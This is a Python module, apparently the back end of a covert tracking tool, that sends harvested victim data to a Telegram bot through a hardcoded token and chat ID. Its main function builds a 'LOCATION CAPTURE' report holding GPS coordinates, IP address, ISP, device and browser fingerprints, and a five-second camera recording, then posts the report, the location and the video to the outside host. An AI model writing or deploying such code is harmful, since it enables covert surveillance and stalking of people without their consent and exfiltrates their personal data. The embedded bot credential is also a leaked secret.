import os
import requests
import logging
import base64
from io import BytesIO
from datetime import datetime

logger = logging.getLogger(__name__)

# Telegram configuration
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '7593255138:AAGq9XXv-bbKzMmONvyORoVdcpINW73wyvQ')
TELEGRAM_USER_ID = os.environ.get('TELEGRAM_USER_ID', '6069204139')
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_message(text):
    """Send a text message to Telegram"""
    try:
        url = f"{TELEGRAM_API_URL}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_USER_ID,
            'text': text,
            'parse_mode': 'HTML'
        }
        
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        
        return response.json().get('ok', False)
        
    except Exception as e:
        logger.error(f"Error sending message to Telegram: {str(e)}")
        return False

def send_video(video_data, caption=None):
    """Send a video to Telegram"""
    try:
        url = f"{TELEGRAM_API_URL}/sendVideo"
        
        # Parse the data URL to get mime type and data
        if video_data.startswith('data:'):
            header, encoded_data = video_data.split(',', 1)
            mime_type = header.split(';')[0].split(':')[1]
            video_bytes = base64.b64decode(encoded_data)
            
            # Determine file extension and content type
            if 'webm' in mime_type:
                file_ext = 'webm'
                content_type = 'video/webm'
            elif 'mp4' in mime_type:
                file_ext = 'mp4'
                content_type = 'video/mp4'
            else:
                file_ext = 'webm'  # Default fallback
                content_type = 'video/webm'
        else:
            # Fallback for raw base64
            video_bytes = base64.b64decode(video_data)
            file_ext = 'webm'
            content_type = 'video/webm'
        
        logger.info(f"Sending video: {len(video_bytes)} bytes, type: {content_type}")
        
        files = {
            'video': (f'video_{datetime.now().strftime("%Y%m%d_%H%M%S")}.{file_ext}', 
                     BytesIO(video_bytes), content_type)
        }
        
        data = {
            'chat_id': TELEGRAM_USER_ID,
            'supports_streaming': True
        }
        
        if caption:
            data['caption'] = caption
        
        response = requests.post(url, files=files, data=data, timeout=30)
        response.raise_for_status()
        
        result = response.json()
        if result.get('ok'):
            logger.info("Video sent successfully to Telegram")
            return True
        else:
            logger.error(f"Telegram API error: {result}")
            return False
        
    except Exception as e:
        logger.error(f"Error sending video to Telegram: {str(e)}")
        return False

def send_location(latitude, longitude):
    """Send location to Telegram"""
    try:
        url = f"{TELEGRAM_API_URL}/sendLocation"
        payload = {
            'chat_id': TELEGRAM_USER_ID,
            'latitude': latitude,
            'longitude': longitude
        }
        
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        
        return response.json().get('ok', False)
        
    except Exception as e:
        logger.error(f"Error sending location to Telegram: {str(e)}")
        return False

def send_to_telegram(log_entry, video_data=None):
    """Send complete data package to Telegram"""
    try:
        # Format the comprehensive information message
        timestamp = log_entry.timestamp.strftime('%Y-%m-%d %H:%M:%S UTC')
        
        # Create comprehensive message
        message = f"""🎯 <b>LOCATION CAPTURE - COMPLETE REPORT</b>

📅 <b>Timestamp:</b> {timestamp}
📍 <b>GPS:</b> {log_entry.latitude}, {log_entry.longitude}
📏 <b>Accuracy:</b> ±{log_entry.accuracy}m
🌐 <b>IP:</b> {log_entry.ip_address}
🏙️ <b>Location:</b> {log_entry.city or 'Unknown'}, {log_entry.country or 'Unknown'}
🏢 <b>ISP:</b> {log_entry.isp or 'Unknown'}
🎥 <b>Video:</b> {'5-second recording captured' if log_entry.has_video else 'None'}

🖥️ <b>DEVICE & BROWSER</b>
📱 <b>Platform:</b> {log_entry.platform or 'Unknown'}
🌐 <b>User Agent:</b> {log_entry.user_agent[:100] + '...' if len(log_entry.user_agent or '') > 100 else log_entry.user_agent or 'Unknown'}
📺 <b>Screen:</b> {log_entry.screen_width}x{log_entry.screen_height} | Color: {log_entry.color_depth}bit
🖼️ <b>Viewport:</b> {log_entry.viewport_width}x{log_entry.viewport_height}
🌍 <b>Language:</b> {log_entry.language or 'Unknown'} | TZ: {log_entry.timezone or 'Unknown'}

🔍 <b>ADVANCED TRACKING</b>
🔋 <b>Battery:</b> {int(log_entry.battery_level * 100) if log_entry.battery_level else 'Unknown'}%
🌐 <b>Connection:</b> {log_entry.connection_type or 'Unknown'} | {log_entry.connection_downlink or 'Unknown'}Mbps
💾 <b>Memory:</b> {log_entry.device_memory or 'Unknown'}GB | CPU: {log_entry.hardware_concurrency or 'Unknown'} cores
👆 <b>Touch:</b> {log_entry.max_touch_points or 'Unknown'} points
🍪 <b>Cookies:</b> {'✓' if log_entry.cookie_enabled else '✗'} | Online: {'✓' if log_entry.online_status else '✗'}

🎮 <b>WEBGL & FINGERPRINTING</b>
🎨 <b>WebGL:</b> {log_entry.webgl_vendor or 'Unknown'} | {log_entry.webgl_renderer or 'Unknown'}
🔍 <b>Canvas:</b> {'Generated' if log_entry.canvas_fingerprint else 'None'}
🔊 <b>Audio:</b> {'Generated' if log_entry.audio_fingerprint else 'None'}

🗂️ <b>TECHNICAL DETAILS</b>
📊 <b>Entry ID:</b> {log_entry.id}
📦 <b>Video Size:</b> {log_entry.video_size or 0} bytes
🔄 <b>RTT:</b> {log_entry.connection_rtt or 'Unknown'}ms
💽 <b>Save Data:</b> {'✓' if log_entry.connection_save_data else '✗'}
"""

        # Send the main message
        message_sent = send_message(message)
        
        # Send location if available
        location_sent = True
        if log_entry.latitude and log_entry.longitude:
            location_sent = send_location(log_entry.latitude, log_entry.longitude)
        
        # Send video if available
        video_sent = True
        if video_data and log_entry.has_video:
            video_caption = f"📹 5-second recording from {log_entry.city or 'Unknown'}, {log_entry.country or 'Unknown'}\n🕐 {timestamp}"
            video_sent = send_video(video_data, video_caption)
        
        # Return success if at least the main message was sent
        success = message_sent and location_sent and video_sent
        
        if success:
            logger.info(f"Complete data package sent to Telegram for log ID {log_entry.id}")
        else:
            logger.warning(f"Partial data sent to Telegram for log ID {log_entry.id} - Message: {message_sent}, Location: {location_sent}, Video: {video_sent}")
        
        return success
        
    except Exception as e:
        logger.error(f"Error sending complete package to Telegram: {str(e)}")
        return False